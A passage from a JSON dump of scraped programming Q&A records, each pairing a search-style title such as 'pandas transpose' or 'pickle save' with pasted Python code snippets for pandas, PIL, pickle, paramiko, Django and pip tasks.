28.0   28.0   31.0 #4        E      19.0   20.0   85.0 #5        F      84.0  193.0   70.0 #total  NaN     319.0  400.0  398.0 \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2733,
    "keyword": null,
    "link": null,
    "title": " pandas summarize all columns",
    "description": "users.describe(include='all')\nIn [8]: titanic[[\"Sex\", \"Age\"]].groupby(\"Sex\").mean() Out[8]:                Age Sex               female  27.915709 male    30.726645 \n",
    "reg_date": "2021-10-12T11:32:16.000Z"
  },
  {
    "id": 2734,
    "keyword": null,
    "link": null,
    "title": " pandas timedelta to seconds",
    "description": "df['column_with_timedelta'].dt.total_seconds()\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2735,
    "keyword": null,
    "link": null,
    "title": " pandas timestamp to string",
    "description": "Consider the dataframe df  df = pd.DataFrame(dict(timestamp=pd.to_datetime(['2000-01-01'])))  df     timestamp 0 2000-01-01 Use the datetime accessor dt to access the strftime method. You can pass a format string to strftime and it will return a formatted string. When used with the dt accessor you will get a series of strings.  df.timestamp.dt.strftime('%Y-%m-%d')  0    2000-01-01 Name: timestamp, dtype: object Visit strftime.org for a handy set of format strings.\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2736,
    "keyword": null,
    "link": null,
    "title": " pandas to convert null values to mean in numeric column",
    "description": "df.fillna(df.mean(), inplace=True)\ndf.fillna(df.mean())\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2737,
    "keyword": null,
    "link": null,
    "title": " pandas to csv delimiter",
    "description": "df.to_csv('modified.txt', index=False, sep='\\t')\ndf.to_csv('file.csv', index=False)\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2738,
    "keyword": null,
    "link": null,
    "title": " pandas to csv without header",
    "description": "file = pd.read_csv(file_name, header=None) \ndf = pd.read_csv(train_file_path,sep=\"\\t\", header=None)\nimport pandas as pd  pd.read_csv(FILE_PATH, header=None)\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2739,
    "keyword": null,
    "link": null,
    "title": " pandas to excel add another sheet in existing excel file",
    "description": "import pandas as pd from openpyxl import load_workbook   FilePath = \"your excel path\" ExcelWorkbook = load_workbook(FilePath) writer = pd.ExcelWriter(FilePath, engine = 'openpyxl') writer.book = ExcelWorkbook df.to_excel(writer, sheet_name = 'your sheet name') writer.save() writer.close() \n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2740,
    "keyword": null,
    "link": null,
    "title": " pandas to list",
    "description": "df.values.tolist() \nlst = data.tolist() # data is pandas series\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2741,
    "keyword": null,
    "link": null,
    "title": " pandas transpose",
    "description": "result = df.transpose()     \ndf.T df.head().T\nIn [11]: df Out[11]:          10  20  30  70 data1:  2.3   5   6   7  In [12]: df.T Out[12]:     data1: 10     2.3 20     5.0 30     6.0 70     7.0\n| id | name | country01 | sort01 | country02 | sort02 | country03 | sort03 | | 1 | Foo | USA | 1 | Japan | 2 | China | 3 | | 2 | Bar | USA | 1| UK | 3 | France | 4 | | 3 | Zap | Japan | 2 | UK | 3 | Russia | 5 |\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2742,
    "keyword": null,
    "link": null,
    "title": " pandas ttable with sum totals",
    "description": "import numpy as np import pandas as pd   df = pd.DataFrame({'a': [10,20],'b':[100,200],'c': ['a','b']})  df.loc['Column_Total']= df.sum(numeric_only=True, axis=0) df.loc[:,'Row_Total'] = df.sum(numeric_only=True, axis=1)  print(df)                   a      b    c  Row_Total 0             10.0  100.0    a      110.0 1             20.0  200.0    b      220.0 Column_Total  30.0  300.0  NaN      330.0\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2743,
    "keyword": null,
    "link": null,
    "title": " pandas two conditions filter",
    "description": "# when you wrap conditions in parantheses, you give order # you do those in brackets first before 'and' # AND movies[(movies.duration >= 200) & (movies.genre == 'Drama')] \n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2744,
    "keyword": null,
    "link": null,
    "title": " pandas update with condition",
    "description": "import pandas as pd import numpy as np  df = pd.DataFrame({'value':np.arange(1000000)})  # Solution 1 - Fastest : df['value'] = np.where(df['value'] > 20000, 0, df['value'])  # Solution 2: df.loc[df['value'] > 20000, 'value'] = 0  # Solution 3: df['value'] = df['value'].mask(df['value'] > 20000, 0)  # Solution 4 - Slowest, note that df.where applies where condition is wrong: df['a'] = df.where(df.a <= 20000, 0) \ndf.loc[df['dollars_spent'] > 0, 'purchase'] = 1\n",
    "reg_date": "2021-10-12T11:32:17.000Z"
  },
  {
    "id": 2745,
    "keyword": null,
    "link": null,
    "title": " pandas version check in python",
    "description": "import pandas as pd  print(pd.__version__) # 0.22.0 \n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2746,
    "keyword": null,
    "link": null,
    "title": " pandas version from python script",
    "description": "import pandas as pd  print(pd.__version__) # 0.22.0 \n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2747,
    "keyword": null,
    "link": null,
    "title": " pandas xlsx to csv",
    "description": "import pandas as pd data_xls = pd.read_excel('excelfile.xlsx', 'Sheet2', dtype=str, index_col=None) data_xls.to_csv('csvfile.csv', encoding='utf-8', index=False) \nssconvert --export-type=Gnumeric_stf:stf_csv SampleData.xlsx convert.csv\n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2748,
    "keyword": null,
    "link": null,
    "title": " par o inpar python",
    "description": "#Please visit my website: GarlokDev.com  number = input(\"\\nInsert here the number: \")  print(\"\\nYou have inserted: \" + number)  f_number = number[-1]  par = [2, 4, 6, 8, 0]  if f_number in par:         print(\"\\n\" + numeber + \" is a pair number\") else:         print(\"\\n\" + number + \" is a odd number\")  \n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2749,
    "keyword": null,
    "link": null,
    "title": " paramiko count file",
    "description": "import paramiko  ip   =  'your remote ip' username  =  'your user_name' password  =  'your password'  path = 'your path you want to count file'  ssh = paramiko.SSHClient() ssh.load_system_host_keys() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(ip, username=username, password=password) sftp = ssh.open_sftp() ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('cd ' + path + ' && ls | wc -l')  print(ssh_stdout.read().decode(\"utf-8\"))\n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2750,
    "keyword": null,
    "link": null,
    "title": " parcourir une liste par la fin python",
    "description": "for elt in lst[::-1]:     print(elt) \n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2751,
    "keyword": null,
    "link": null,
    "title": " parse dates format pandas",
    "description": "mydateparser = lambda x: pd.datetime.strptime(x, \"%Y %m %d %H:%M:%S\") df = pd.read_csv(\"file.csv\", sep='\\t', names=['date_column', 'other_column'], parse_dates=['date_column'], date_parser=mydateparser) \npd.read_csv('data/data_1.csv', parse_dates=['date'], dayfirst=True)\nimport pandas as pd  values = {'dates':  ['20190902','20190913','20190921'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  print (df) print (df.dtypes) \nimport pandas as pd  values = {'dates':  ['02Sep2019','13Sep2019','21Sep2019'],           'status': ['Opened','Opened','Closed']           }  df = pd.DataFrame(values, columns = ['dates','status'])  df['dates'] = pd.to_datetime(df['dates'], format='%d%b%Y')  print (df) print (df.dtypes) \nformat='%Y%m%d%H%M%S' \n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2752,
    "keyword": null,
    "link": null,
    "title": " parse first characters from string python",
    "description": "# Get First 3 character of a string in python first_chars = sample_str[0:3]  print('First 3 characters: ', first_chars)  # Output: First 3 characters: Hel\nstring = 'This is a string' print(string[0]) #output: 'T'\n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2753,
    "keyword": null,
    "link": null,
    "title": " pass argument to a py file",
    "description": "import sys  def hello(a,b):     print \"hello and that's your sum:\", a + b  if __name__ == \"__main__\":     a = int(sys.argv[1])     b = int(sys.argv[2])     hello(a, b) # If you type : py main.py 1 5 # It should give you \"hello and that's your sum:6\"\n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2754,
    "keyword": null,
    "link": null,
    "title": " pass variable in subprocess run python",
    "description": "#ran in python 3.8.x  cmd = \"ls\" cmd_args = \"-l\" subprocess.run([cmd, cmd_args])\n",
    "reg_date": "2021-10-12T11:32:18.000Z"
  },
  {
    "id": 2755,
    "keyword": null,
    "link": null,
    "title": " password generator python",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\n#This is giving you a password with 8 strings and 4 numbers: import random i=0  list=[] while i < 12:     while i < 8:         list.append(random.choice(string.ascii_letters))         i+=1     while i < 12:         list.append(random.randint(0, 9))         i+=1      list=' '.join([str(elem) for elem in list]) print(\"Your new password: \", list.replace(\" \", \"\"))\nimport random import string  x = str(input(\"Do you want a password? y/n \"))  list = [] if x == \"y\":     print(\"Alright!\")     for i in range(16):         _1 = random.choice(string.ascii_letters)         _2 = random.randint(1, 9)         list.append(_1)         list.append(_2) else:     print(\"ok\")   def convert(list):             s = [str(i) for i in list]             res = \"\".join(s)             return(print(res))    convert(list)  \nimport random letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+'] print(\"Welcome to the PyPassword Generator!\") nr_letters = int(input(\"How many letters would you like in your password?\\n\"))  nr_symbols = int(input(f\"How many symbols would you like?\\n\")) nr_numbers = int(input(f\"How many numbers would you like?\\n\")) password_list = [] for char in range(1, nr_letters + 1):   password_list.append(random.choice(letters)) for char in range(1, nr_symbols + 1):   password_list += random.choice(symbols) for char in range(1, nr_numbers + 1):   password_list += random.choice(numbers)  random.shuffle(password_list) password = \"\" for char in password_list:   password += char print(f\"Your password is: {password}\")\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2756,
    "keyword": null,
    "link": null,
    "title": " pause program python",
    "description": ">>> import time >>> time.sleep(3) # Sleep for 3 seconds \nimport time print(\"This is how to pause a program\") time.sleep(5) print(\"Did you saw that i slept for 5 seconds\")\n# To delay excusion use the time library import time  time.sleep(secs)\n# Don't use os.system(\"pause\"), it is very slow because it needs to create # an entire shell process. Use this instead:  import getch  def pause():   print(\"Press any key to continue . . . \")   getch.getch()\nimport time time.sleep(5) # Wacht 5 seconden\nimport time time.sleep(seconds)\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2757,
    "keyword": null,
    "link": null,
    "title": " pca python",
    "description": "import numpy as np from sklearn.decomposition import PCA  pca = PCA(n_components = 3) # Choose number of components pca.fit(X) # fit on X_train if train/test split applied  print(pca.explained_variance_ratio_)\nfrom sklearn.decomposition import KernelPCA kpca = KernelPCA(n_components = 2, kernel = 'rbf') X_train = kpca.fit_transform(X_train) X_test = kpca.transform(X_test)\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2758,
    "keyword": null,
    "link": null,
    "title": " pd.options.display.max columns()pd.options.display.max row()",
    "description": "pd.set_option('display.max_columns', 200) pd.set_option('display.max_rows', 100) pd.set_option('display.min_rows', 100) pd.set_option('display.expand_frame_repr', True) \n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2759,
    "keyword": null,
    "link": null,
    "title": " pd.set option('display.max columns', 200) pd.set option('display.max rows', 100)",
    "description": "pd.set_option('display.max_columns', None)\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2760,
    "keyword": null,
    "link": null,
    "title": " pd.set option('display.max columns', None)",
    "description": "pd.set_option('display.max_columns', None)\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None) #used for expanding the no o viible columns of dataframe\nimport pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000) \nprint(dataframe.columns)\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2761,
    "keyword": null,
    "link": null,
    "title": " pd.set option('display.max columns' none)",
    "description": "pd.set_option('display.max_columns', None)\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None) #used for expanding the no o viible columns of dataframe\nimport pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000) \npd.set_option('display.max_columns', 200) pd.set_option('display.max_rows', 100) pd.set_option('display.min_rows', 100) pd.set_option('display.expand_frame_repr', True) \nprint(dataframe.columns)\n# with HTML output from IPython.display import display_html  def display_frames(frames, num_space=0):     t_style = '<table style=\"display: inline;\"'     tables_html = [df.to_html().replace('<table',t_style)                   for df in frames]     space = '&nbsp;' * num_space     display_html(space.join(tables_html),raw=True)  years = 2016,2017,2018 # initial data. stock_tables = [pd.read_csv('stocks_{}.csv'.format(year))                 for year in years]  display_frames(stock_tables,10) stocks_2016, stocks_2017, stocks_2018 = stock_tables\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2762,
    "keyword": null,
    "link": null,
    "title": " pd.to datetime python",
    "description": "import pandas as pd date='2020/11/26 12:00:00' date_time=pd.to_datetime(date, format='%Y/%m/%d %H:%M:%S')\n",
    "reg_date": "2021-10-12T11:32:19.000Z"
  },
  {
    "id": 2763,
    "keyword": null,
    "link": null,
    "title": " pd combine date time",
    "description": "If df.Date and df.Time are of type str: pd.to_datetime(df.Date + ' ' + df.Time)  If df.Date and df.Time are of type datetime.date and datetime.time respectively: pd.to_datetime(df.Date.astype(str) + ' ' + df.Time.astype(str))\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2764,
    "keyword": null,
    "link": null,
    "title": " pd read csv unname",
    "description": "pd.read_csv(file_name, index_col=0)\ndf = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \n pd.read_csv(file_name, index_col=0)\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2765,
    "keyword": null,
    "link": null,
    "title": " pd set output to currency",
    "description": "#make large numbers more readable by adding commas pd.options.display.float_format = '{:,}'.format # Example 123456789.12345 -> 123,456,789.12345  #this adds commas and limits decimals to 2 places pd.options.display.float_format = '{:,.2f}'.format # Example 123456789.12345 -> 123,456,789.12  #this adds the dollar sign to the front pd.options.display.float_format = '${:,.2f}'.format # Example 123456789.12345 -> $123,456,789.12\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2766,
    "keyword": null,
    "link": null,
    "title": " pen down python turtle",
    "description": "myTurtle.penup()\nmyTurtle.pendown()\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2767,
    "keyword": null,
    "link": null,
    "title": " pen up python turtle",
    "description": "myTurtle.penup()\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2768,
    "keyword": null,
    "link": null,
    "title": " percent chart seaborn",
    "description": "sns.barplot(x='group', y='Values', data=df, estimator=lambda x: sum(x==0)*100.0/len(x)) \n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2769,
    "keyword": null,
    "link": null,
    "title": " percentage plot of categorical variable in python woth hue",
    "description": "sns.barplot(x='group', y='Values', data=df, estimator=lambda x: sum(x==0)*100.0/len(x)) \n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2770,
    "keyword": null,
    "link": null,
    "title": " perfect number in python",
    "description": "def perfect_number(n):     sum = 0     for x in range(1, n):         if n % x == 0:             sum += x     return sum == n print(perfect_number(6))\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2771,
    "keyword": null,
    "link": null,
    "title": " permanent redirect django",
    "description": "from django.shortcuts import redirect  def my_view(request):     # some code here     return redirect('/some/url/', permanent=True)\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2772,
    "keyword": null,
    "link": null,
    "title": " permutations python",
    "description": "# A Python program to print all permutations using library function  from itertools import permutations perm = permutations([1, 2, 3]) for i in list(perm):     print (i) # (1, 2, 3) # (1, 3, 2) # (2, 1, 3) # (2, 3, 1) # (3, 1, 2) # (3, 2, 1)\nimport itertools print(list(itertools.permutations([1,2,3])))\nimport itertools  a = [1, 2, 3] n = 3  perm_iterator = itertools.permutations(a, n)  for item in perm_iterator:     print(item)\n>>> from itertools import permutations >>> perms = [''.join(p) for p in permutations('stack')] >>> perms \nfrom itertools import permutations\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2773,
    "keyword": null,
    "link": null,
    "title": " phi",
    "description": "import math phi = (1 + math.sqrt(5))/2  # Approx: 1.618033988749895\nPhi: &phi; | ϕ\n",
    "reg_date": "2021-10-12T11:32:20.000Z"
  },
  {
    "id": 2774,
    "keyword": null,
    "link": null,
    "title": " philips hue python",
    "description": "#!/usr/bin/python  from phue import Bridge  b = Bridge('ip_of_your_bridge')  # If the app is not registered and the button is not pressed, press the button and call connect() (this only needs to be run a single time) b.connect()  # Get the bridge state (This returns the full dictionary that you can explore) b.get_api()  # Prints if light 1 is on or not b.get_light(1, 'on')  # Set brightness of lamp 1 to max b.set_light(1, 'bri', 254)  # Set brightness of lamp 2 to 50% b.set_light(2, 'bri', 127)  # Turn lamp 2 on b.set_light(2,'on', True)  # You can also control multiple lamps by sending a list as lamp_id b.set_light( [1,2], 'on', True)  # Get the name of a lamp b.get_light(1, 'name')  # You can also use light names instead of the id b.get_light('Kitchen') b.set_light('Kitchen', 'bri', 254)  # Also works with lists b.set_light(['Bathroom', 'Garage'], 'on', False)  # The set_light method can also take a dictionary as the second argument to do more fancy stuff # This will turn light 1 on with a transition time of 30 seconds command =  {'transitiontime' : 300, 'on' : True, 'bri' : 254} b.set_light(1, command)\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2775,
    "keyword": null,
    "link": null,
    "title": " phone number regex python",
    "description": "(\\d{3}[-\\.\\s]??\\d{3}[-\\.\\s]??\\d{4}|\\(\\d{3}\\)\\s*\\d{3}[-\\.\\s]??\\d{4}|\\d{3}[-\\.\\s]??\\d{4}) \n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2776,
    "keyword": null,
    "link": null,
    "title": " pi",
    "description": "Happy pi day to all of you!!!\n3.1415926535897932384626433832795028841971693993\n3.14159265358979323846264338327950288419716939937510582097494459230781640628\n3.14159 \n3.14159265359\n#include<iostream> #include<iomanip> // /*base(27) 29421  796842 */ ;)  int main (){    std::cout<<\"Please enter a small real number:\\t\";    double smallnumb;    std::cin>>smallnumb;    double element1{0.0f};double element2{0.0f};    double summed2{0.0f};    double n{0.0f};size_t counter{1};     while(true){       element1=(4.0f/(n+1.0f));       element2=(4.0f/(n+3.0f));       summed2+=(element1-element2);       n+=4.0f;       counter+=1;       if(element1<=smallnumb||element2<=smallnumb){           break;       }     }     std::cout<<std::fixed<<std::setprecision(10)<<summed2<<std::endl;     std::cout<<counter/2<<std::endl;     return 0 ; }  \n# pi - 25 fractional digits pi = 3.1415926535897932384626433  # pi - 50 fractional digits pi = 3.14159265358979323846264338327950288419716939937510  # pi - 100 fractional digits pi = 3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679  # pi - 1000 fractional digits pi = 3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989 \n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2777,
    "keyword": null,
    "link": null,
    "title": " pi in python math",
    "description": ">>>import math >>> math.pi 3.141592653589793\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2778,
    "keyword": null,
    "link": null,
    "title": " pick random entry in dict python",
    "description": "from random import choice  dictionary[choice(list(dictionary.keys()))] # where \"dictionary\" is the label of, guess what, the variable holding a dictionary you want a random item from.\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2779,
    "keyword": null,
    "link": null,
    "title": " pickle a dictionary",
    "description": "import pickle #credits to stack overflow user= blender  a = {'hello': 'world'}  with open('filename.pkl', 'wb') as handle:     pickle.dump(a, handle, protocol=pickle.HIGHEST_PROTOCOL)  with open('filename.pkl', 'rb') as handle:     b = pickle.load(handle)  print (a == b)\nimport pickle file_name='my_file.pkl' f = open(file_name,'wb') pickle.dump(my_data,f) f.close()\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2780,
    "keyword": null,
    "link": null,
    "title": " pickle dump",
    "description": "import pickle #credits to stack overflow user= blender  a = {'hello': 'world'}  with open('filename.pkl', 'wb') as handle:     pickle.dump(a, handle, protocol=pickle.HIGHEST_PROTOCOL)  with open('filename.pkl', 'rb') as handle:     b = pickle.load(handle)  print (a == b)\nimport pickle file_name='my_file.pkl' f = open(file_name,'wb') pickle.dump(my_data,f) f.close()\nimport pickle  pickle.dump( favorite_color, open( \"save.p\", \"wb\" ) ) favorite_color = pickle.load( open( \"save.p\", \"rb\" ) )\nimport pickle with open('Fruits.obj', 'wb') as fp: \tpickle.dump(banana, fp) \nimport pickle # load : get the data from file data = pickle.load(open(file_path, \"rb\")) # loads : get the data from var data = pickle.load(var)\nwith open('filename', 'rb') as f:     x = pickle.load(f) \n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2781,
    "keyword": null,
    "link": null,
    "title": " pickle save",
    "description": "import pickle  pickle.dump( favorite_color, open( \"save.p\", \"wb\" ) ) favorite_color = pickle.load( open( \"save.p\", \"rb\" ) )\nwith open('mypickle.pickle', 'wb') as f:     pickle.dump(some_obj, f)  # note that this will overwrite any existing file # in the current working directory called 'mypickle.pickle' \nPython 3.4.1 (default, May 21 2014, 12:39:51)  [GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.2.79)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> mylist = ['I wish to complain about this parrot what I purchased not half an hour ago from this very boutique.', \"Oh yes, the, uh, the Norwegian Blue...What's,uh...What's wrong with it?\", \"I'll tell you what's wrong with it, my lad. 'E's dead, that's what's wrong with it!\", \"No, no, 'e's uh,...he's resting.\"] >>>  >>> import pickle >>>  >>> with open('parrot.pkl', 'wb') as f: ...   pickle.dump(mylist, f) ...  >>>  with open('parrot.pkl', 'wb') as f: ...   new_list = pickle.load(mylist, f)  \n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2782,
    "keyword": null,
    "link": null,
    "title": " pie chart python pandas",
    "description": "df = pd.DataFrame({'mass': [0.330, 4.87 , 5.97],                    'radius': [2439.7, 6051.8, 6378.1]},                     index = ['Mercury', 'Venus', 'Earth'])  plot = df.plot.pie(y='mass', figsize=(5, 5))\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2783,
    "keyword": null,
    "link": null,
    "title": " pil get image size",
    "description": "image = PIL.Image.open(\"sample.png\") width, height = image.size\nfrom PIL import Image  im = Image.open('whatever.png') width, height = im.size\n",
    "reg_date": "2021-10-12T11:32:21.000Z"
  },
  {
    "id": 2784,
    "keyword": null,
    "link": null,
    "title": " pil image from numpy",
    "description": "from PIL import Image image_from_array = Image.fromarray(nd_array)\nfrom PIL import Image  PIL_image = Image.fromarray(numpy_image.astype('uint8'), 'RGB')\n>>> pix = numpy.array(pic)\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2785,
    "keyword": null,
    "link": null,
    "title": " pil save image",
    "description": "from PIL import Image  newImg1 = Image.new('RGB', (512,512)) newImg1.save(\"img1.png\")\nimport os from PIL import Image  PATH = \"F:\\\\FYP DATASET\\\\images\\\\outliers Dataset\\\\Not Outliers\\\\\" Copy_to_path=\"F:\\\\FYP DATASET\\\\images\\\\outliers Dataset\\\\\"  for filename in os.listdir(PATH):     img = Image.open(os.path.join(PATH, filename)) # images are color images     img = img.resize((224,224), Image.ANTIALIAS)     img.save(Copy_to_path+filename+'.jpeg')  \nim = Image.open('image.jpg')   im = im.resize((w, h)) \nim.save(file + \".thumbnail\", \"JPEG\")\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2786,
    "keyword": null,
    "link": null,
    "title": " pillow python crop",
    "description": "im = Image.open('image.jpg')  im = im.crop((left, top, width, height))  #       ├─input image width─┤ #   ┬   ┌───────────────────┐ ┬   ┬    #   │   │                   │top  │    # input │       ┌───────┐   │ ┴ height # image │       │       │   │     │    # height│       └───────┘   │     ┴    #   │   │                   │   #   ┴   └───────────────────┘    #       ├─left─┤ #       ├─────width─────┤\nim = Image.open('image.jpg')  im = im.crop((left, top, right, bottom))  # coordinates of the crop\nim = Image.open('0.png').convert('L') im = im.crop((1, 1, 98, 33)) im.save('_0.png')\nimport cv2 img = cv2.imread(\"lenna.png\") crop_img = img[y:y+h, x:x+w] cv2.imshow(\"cropped\", crop_img) cv2.waitKey(0)\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2787,
    "keyword": null,
    "link": null,
    "title": " pip3 install pyaml",
    "description": "pip install PyYAML\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2788,
    "keyword": null,
    "link": null,
    "title": " pip3 upgrade",
    "description": "pip3 install --upgrade pip\npython -m pip install --upgrade pip\npip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U\npip install --upgrade pip\npy2 $ pip install pip-review  $ pip-review --local --interactive  py3 $ pip3 install pip-review  $ py -3 -m pip_review --local --interactive\n$ pip download SomePackage $ pip download -d . SomePackage  # equivalent to above $ pip download --no-index --find-links=/tmp/wheelhouse -d /tmp/otherwheelhouse SomePackage \n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2789,
    "keyword": null,
    "link": null,
    "title": " pip fuzzywuzzy",
    "description": "pip install fuzzywuzzy \n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2790,
    "keyword": null,
    "link": null,
    "title": " pip install colab",
    "description": "from google.colab import files files.download(\"path\")\n!pip install matplotlib-venn\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2791,
    "keyword": null,
    "link": null,
    "title": " pip install django rest framework",
    "description": "pip install djangorestframework\npip install djangorestframework pip install markdown       # Markdown support for the browsable API. pip install django-filter  # Filtering support\npip install Django django-rest-framework\npip install djangorestframework pip install markdown       \t\t\t# Markdown support for the browsable API. pip install django-filter  \t\t\t# Filtering support\nfrom django.contrib.auth.models import User, Group from rest_framework import serializers   class UserSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = User         fields = ['url', 'username', 'email', 'groups']   class GroupSerializer(serializers.HyperlinkedModelSerializer):     class Meta:         model = Group         fields = ['url', 'name']\nfrom django.urls import include, path from rest_framework import routers from tutorial.quickstart import views  router = routers.DefaultRouter() router.register(r'users', views.UserViewSet) router.register(r'groups', views.GroupViewSet)  # Wire up our API using automatic URL routing. # Additionally, we include login URLs for the browsable API. urlpatterns = [     path('', include(router.urls)),     path('api-auth/', include('rest_framework.urls', namespace='rest_framework')) ]\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2792,
    "keyword": null,
    "link": null,
    "title": " pip install mysqldb",
    "description": "Consider using mysql client instead  pip install mysqlclient\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
    "id": 2793,
    "keyword": null,
    "link": null,
    "title": " pip install on different version of python",
    "description": " py -<python_version> -m pip install <package_name>\n",
    "reg_date": "2021-10-12T11:32:22.000Z"
  },
  {
